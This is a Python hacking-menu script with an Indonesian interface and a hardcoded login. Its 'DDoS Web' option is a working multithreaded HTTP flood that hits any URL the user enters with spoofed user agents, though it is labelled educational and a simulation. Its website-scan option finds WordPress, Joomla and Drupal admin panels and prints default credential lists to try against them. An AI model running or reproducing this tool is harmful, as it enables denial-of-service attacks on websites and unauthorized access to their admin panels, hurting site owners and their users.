import random
import time
import os
import sys
from colorama import Fore, init, Style
import socket
import threading
import requests
from urllib.parse import urlparse
import whois
import dns.resolver

# Initialize colorama
init(autoreset=True)

# Login credentials
CORRECT_USERNAME = "X"
CORRECT_PASSWORD = "EXE"

# dfauld
DEFAULT_CREDENTIALS = {
    "wordpress": {
        "admin_panels": ["/wp-admin", "/wp-login.php"],
        "usernames": ["admin", "administrator", "wpadmin"],
        "passwords": ["admin", "password", "123456", "wpadmin"]
    },
    "joomla": {
        "admin_panels": ["/administrator"],
        "usernames": ["admin", "superuser"],
        "passwords": ["admin", "password", "123456"]
    },
    "drupal": {
        "admin_panels": ["/user/login"],
        "usernames": ["admin", "drupal"],
        "passwords": ["admin", "password", "123456"]
    }
}

# Fungsi tambahan untuk fitur cek website
def get_website_info(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        
        print(f"\n{Fore.YELLOW}[*] Memulai scan untuk {domain}...")
        
        # 1. Cek DNS records
        print(f"\n{Fore.CYAN}[1] DNS Information:")
        try:
            answers = dns.resolver.resolve(domain, 'A')
            for rdata in answers:
                print(f"{Fore.WHITE}  A Record: {rdata.address}")
        except:
            print(f"{Fore.RED}  Tidak bisa mendapatkan A record")
        
        # 2. Cek WHOIS information
        print(f"\n{Fore.CYAN}[2] WHOIS Information:")
        try:
            w = whois.whois(domain)
            print(f"{Fore.WHITE}  Domain: {w.domain_name}")
            print(f"  Registrar: {w.registrar}")
            print(f"  Creation Date: {w.creation_date}")
            print(f"  Expiration Date: {w.expiration_date}")
            print(f"  Name Servers: {w.name_servers}")
        except:
            print(f"{Fore.RED}  Tidak bisa mendapatkan info WHOIS")
        
        # 3. Cek server info dari headers
        print(f"\n{Fore.CYAN}[3] Web Server Information:")
        try:
            response = requests.get(url, timeout=5)
            server = response.headers.get('Server', 'Tidak diketahui')
            print(f"{Fore.WHITE}  Server: {server}")
            print(f"  Status Code: {response.status_code}")
            print(f"  Content Type: {response.headers.get('Content-Type', 'Tidak diketahui')}")
        except:
            print(f"{Fore.RED}  Tidak bisa mendapatkan info server")
        
        # 4. Cek CMS dan admin panels
        print(f"\n{Fore.CYAN}[4] CMS & Admin Panel Detection:")
        found_cms = None
        
        # Cek WordPress
        wp_check = requests.get(url + '/wp-login.php', timeout=5)
        if wp_check.status_code == 200 and 'wp-login' in wp_check.text:
            found_cms = "wordpress"
            print(f"{Fore.WHITE}  CMS: WordPress")
            print(f"  Admin Panel: {url}/wp-admin")
        
        # Cek Joomla
        joomla_check = requests.get(url + '/administrator', timeout=5)
        if joomla_check.status_code == 200 and 'joomla' in joomla_check.text.lower():
            found_cms = "joomla"
            print(f"{Fore.WHITE}  CMS: Joomla")
            print(f"  Admin Panel: {url}/administrator")
        
        # Cek Drupal
        drupal_check = requests.get(url + '/user/login', timeout=5)
        if drupal_check.status_code == 200 and 'drupal' in drupal_check.text.lower():
            found_cms = "drupal"
            print(f"{Fore.WHITE}  CMS: Drupal")
            print(f"  Admin Panel: {url}/user/login")
        
        if not found_cms:
            print(f"{Fore.RED}  CMS tidak terdeteksi atau tidak didukung")
        
        # 5. Tampilkan default credentials jika CMS terdeteksi
        if found_cms in DEFAULT_CREDENTIALS:
            print(f"\n{Fore.CYAN}[5] Default Credentials untuk {found_cms.upper()}:")
            creds = DEFAULT_CREDENTIALS[found_cms]
            print(f"{Fore.YELLOW}  Usernames: {', '.join(creds['usernames'])}")
            print(f"  Passwords: {', '.join(creds['passwords'])}")
            print(f"\n{Fore.RED}PERINGATAN: Jangan gunakan untuk aktivitas ilegal!")
        
        # 6. Cek subdomains umum
        print(f"\n{Fore.CYAN}[6] Mencari common subdomains:")
        common_subdomains = ['admin', 'webmail', 'mail', 'cpanel', 'whm', 'directadmin', 'ftp']
        for sub in common_subdomains:
            try:
                subdomain = f"http://{sub}.{domain}"
                resp = requests.get(subdomain, timeout=3)
                if resp.status_code < 400:
                    print(f"{Fore.WHITE}  Ditemukan: {subdomain} (Status: {resp.status_code})")
            except:
                pass
        
        print(f"\n{Fore.GREEN}[*] Scan selesai untuk {domain}")
        
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}")

# loading matrix
def vertical_matrix_loading(duration=3, columns=5, speed=0.1):
    height = 20  # Number of lines for the vertical animation
    chars = "01"
    
    print(Fore.GREEN)  # Set text color to green
    
    # Create multiple columns of falling characters
    columns_data = []
    for _ in range(columns):
        columns_data.append({
            'position': random.randint(-height, 0),
            'speed': random.uniform(0.05, 0.2),
            'length': random.randint(5, 15)
        })
    
    start_time = time.time()
    while time.time() - start_time < duration:
        # Clear screen (but we'll just print newlines for this demo)
        print("\033[H")  # Move cursor to top-left
        
        # Build each line of the animation
        for line in range(height):
            line_text = ""
            for col in columns_data:
                if 0 <= line - col['position'] < col['length']:
                    # Make head character brighter
                    if line - col['position'] == col['length'] - 1:
                        line_text += Style.BRIGHT + random.choice(chars) + " "
                    else:
                        line_text += random.choice(chars) + " "
                else:
                    line_text += "  "
            print(line_text)
        
        # Update column positions
        for col in columns_data:
            col['position'] += col['speed']
            if col['position'] > height + col['length']:
                col['position'] = -col['length']
                col['length'] = random.randint(5, 15)
                col['speed'] = random.uniform(0.05, 0.2)
        
        time.sleep(speed)
    
    print(Fore.RESET + "\033[H")  # Reset color and move cursor

def install_tools_loading():
    tools = [
        "Kerangka X",
        "Modul EXE",
        "Protokol Keamanan",
        "Inti Matrix",
        "Komponen Antarmuka",
        "Alat Jaringan",
        "Suite Enkripsi",
        "Library Payload"
    ]
    
    width = 50  # Width of the progress bar
    print("\n" + Fore.YELLOW + "    ╔══════════════════════════════════════════════╗")
    print("    ║       MEMASANG ALAT X v1.0 (INDONESIA)      ║")
    print("    ╚══════════════════════════════════════════════╝" + Fore.RESET)
    
    for i in range(101):
        time.sleep(0.05)  # Faster progress for demo purposes
        
        # Calculate progress bar components
        filled = int(width * i / 100)
        empty = width - filled
        percent = i
        
        # Choose color based on progress
        if i < 30:
            color = Fore.RED
        elif i < 70:
            color = Fore.YELLOW
        else:
            color = Fore.GREEN
        
        # Build the progress bar
        progress_bar = color + "█" * filled + Fore.LIGHTBLACK_EX + "░" * empty
        
        # Randomly select a tool to show as currently installing
        current_tool = random.choice(tools) if i % 20 == 0 else ""
        
        print(f"\r    {progress_bar} {color}{percent:3}%", end="")
        print(f" {Fore.CYAN}{current_tool.ljust(20)}", end="")
        
        # Flush output to make sure it updates immediately
        sys.stdout.flush()
    
    print("\n\n" + Fore.GREEN + "    Pemasangan berhasil! Menjalankan sistem..." + Fore.RESET)
    time.sleep(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_exe_banner():
    colors = [Fore.RED, Fore.WHITE, Fore.RED, Fore.WHITE, Fore.RED, Fore.WHITE]
    exe_art = """
    ╔══════════════════════════════════════════════╗
    ║ ███████╗██╗  ██╗███████╗  ███████╗██╗  ██╗ ║
    ║ ██╔════╝╚██╗██╔╝██╔════╝  ╚════██║╚██╗██╔╝ ║
    ║ █████╗   ╚███╔╝ █████╗      ███╔═╝ ╚███╔╝  ║
    ║ ██╔══╝   ██╔██╗ ██╔══╝     ██╔══╝  ██╔██╗  ║
    ║ ███████╗██╔╝ ██╗███████╗  ███████╗██╔╝ ██╗ ║
    ║ ╚══════╝╚═╝  ╚═╝╚══════╝  ╚══════╝╚═╝  ╚═╝ ║
    ╚══════════════════════════════════════════════╝
    """
    
    # Split the art into lines and color each line differently
    lines = exe_art.split('\n')
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        print(color + line)

def show_banner():
    print(Fore.RED + "\n    ╔══════════════════════════════════════════════╗")
    print("    ║          TOOLS BY X - VERSION INDONESIA       ║")
    print("    ╚══════════════════════════════════════════════╝" + Fore.RESET)

def login():
    max_attempts = 3
    attempts = 0
    
    while attempts < max_attempts:
        clear_screen()
        show_exe_banner()
        print(Fore.YELLOW + "\n    ╔══════════════════════════════════════════════╗")
        print("    ║             LOGIN KEAMANAN EXE             ║")
        print("    ╚══════════════════════════════════════════════╝")
        
        username = input(Fore.CYAN + "\n    Username: " + Style.RESET_ALL)
        password = input(Fore.CYAN + "    Password: " + Style.RESET_ALL)
        
        if username == CORRECT_USERNAME and password == CORRECT_PASSWORD:
            print(Fore.GREEN + "\n    Login berhasil! Memulai sistem...")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(Fore.RED + f"\n    Kredensial tidak valid! Sisa percobaan: {remaining}.")
            time.sleep(2)
    
    print(Fore.RED + "\n    Batas percobaan login terlampaui. Sistem terkunci.")
    time.sleep(3)
    return False

def show_menu():
    clear_screen()
    show_exe_banner()
    show_banner()
    print(Fore.WHITE + """
    ╔══════════════════════════════════════════════╗
    ║                MENU UTAMA EXE                ║
    ╠══════════════════════════════════════════════╣
    ║                                              ║
    ║  1. Tentang EXE                             ║
    ║  2. Serangan DDoS Web EXE                   ║
    ║  3. Cek Info Website                        ║
    ║  4. Keluar EXE                              ║
    ║                                              ║
    ╚══════════════════════════════════════════════╝
    """)
    
    try:
        choice = int(input(Fore.CYAN + "\nPilih opsi: " + Fore.RESET))
        return choice
    except ValueError:
        return -1

def about():
    clear_screen()
    show_exe_banner()
    show_banner()
    about_text = Fore.WHITE + """
    ╔══════════════════════════════════════════════╗
    ║              TENTANG TOOLS EXE               ║
    ╠══════════════════════════════════════════════╣
    ║                                              ║
    ║ TOOLS INI DI BUAT OLEH X                     ║
    ║  TIDAK DI GUNAKAN UNTUK HAL YANG ILEGAL.     ║
    ║  JIKA KETAHUAN ADA YANG MENGGUNAKAN TOOLS INI║
    ║  SECARA ILEGAL KAMI TIDAK BERTANGGUNG JAWAB  ║
    ║                                              ║
    ║  Versi: 2.0 EXE RILIS INDONESIA              ║
    ║  Pembuat: X                                  ║
    ║  Status: AKTIF                               ║
    ║  Keamanan: TERLINDUNGI                       ║
    ║                                              ║
    ╚══════════════════════════════════════════════╝
    """
    print(about_text)
    input(Fore.CYAN + "\nTekan Enter untuk kembali ke menu..." + Fore.RESET)

def ddos_web():
    clear_screen()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Fore.WHITE}         WEB DDoS TOOL (FOR EDUCATIONAL PURPOSES)    {Fore.RED}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Fore.RESET}")
    
    print(f"\n{Fore.YELLOW}[!] WARNING: This tool is for educational purposes only!")
    print(f"[!] Do not use this for illegal activities!{Fore.RESET}")
    
    confirm = input(f"\n{Fore.YELLOW}[?] Do you understand and agree? (y/n): {Fore.RESET}")
    if confirm.lower() != 'y':
        return
    
    try:
        url = input(f"\n{Fore.YELLOW}[?] Enter target URL (e.g., http://example.com): {Fore.RESET}")
        if not url:
            print(f"{Fore.RED}[!] URL cannot be empty!{Fore.RESET}")
            return
            
        threads_count = int(input(f"{Fore.YELLOW}[?] Number of threads (default 10): {Fore.RESET}") or 10)
        duration = int(input(f"{Fore.YELLOW}[?] Duration in seconds (default 10): {Fore.RESET}") or 10)
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Verify target is reachable
        try:
            response = requests.get(url, timeout=5)
            if response.status_code >= 400:
                print(f"{Fore.RED}[!] Target seems unreachable (HTTP {response.status_code}){Fore.RESET}")
                input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
                return
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Could not connect to target: {str(e)}{Fore.RESET}")
            input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
            return
    
        print(f"\n{Fore.YELLOW}[*] Preparing DDoS attack simulation...{Fore.RESET}")
        time.sleep(2)
        
        stop_flag = False
        requests_sent = 0
        
        # Reduced list of user agents (30 items)
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203',
            'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
            'Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
        ]
            
        def attack():
            nonlocal requests_sent
            while not stop_flag:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents)
                    }
                    requests.get(url, headers=headers, timeout=1)
                    requests_sent += 1
                except:
                    pass
        
        threads = []
        for _ in range(threads_count):
            thread = threading.Thread(target=attack)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        print(f"\n{Fore.RED}[!] Simulating DDoS attack (press Ctrl+C to stop)...{Fore.RESET}")
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                requests_per_sec = requests_sent / elapsed if elapsed > 0 else 0
                print(f"\r{Fore.YELLOW}Requests sent: {requests_sent} | RPS: {requests_per_sec:.1f}", end="")
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        
        stop_flag = True
        for thread in threads:
            thread.join()
        
        total_time = time.time() - start_time
        requests_per_sec = requests_sent / total_time if total_time > 0 else 0
        
        print(f"\n\n{Fore.CYAN}=== ATTACK SUMMARY ==={Fore.RESET}")
        print(f"{Fore.WHITE}Target: {url}")
        print(f"Duration: {total_time:.1f} seconds")
        print(f"Threads: {threads_count}")
        print(f"Total requests sent: {requests_sent}")
        print(f"Requests per second: {requests_per_sec:.1f}{Fore.RESET}")
        
    except ValueError:
        print(f"{Fore.RED}[!] Invalid input! Please enter numbers for threads and duration.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Fore.RESET}")
    
    input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")

def main():
    try:
        # Initial system check
        print(Fore.YELLOW + "\n    Memeriksa persyaratan sistem..." + Fore.RESET)
        time.sleep(1)
        
        # Show installation progress
        install_tools_loading()
        
        # Show vertical matrix loading
        vertical_matrix_loading(2)
        
        # Login system
        if not login():
            return
        
        # Main menu loop
        while True:
            choice = show_menu()
            
            if choice == 1:
                about()
            elif choice == 2:
                ddos_web()
            elif choice == 3:
                url = input(Fore.YELLOW + "\nMasukkan URL/domain website: " + Fore.RESET)
                get_website_info(url)
                input(Fore.CYAN + "\nTekan Enter untuk kembali ke menu..." + Fore.RESET)
            elif choice == 4:
                print(Fore.YELLOW + "Keluar dari sistem EXE dengan aman..." + Fore.RESET)
                vertical_matrix_loading(1)
                break
            else:
                print(Fore.RED + "Pilihan EXE tidak valid!")
                time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\nProgram dihentikan oleh pengguna.")
    except Exception as e:
        print(Fore.RED + f"\nTerjadi kesalahan: {str(e)}")

if __name__ == "__main__":
    main()
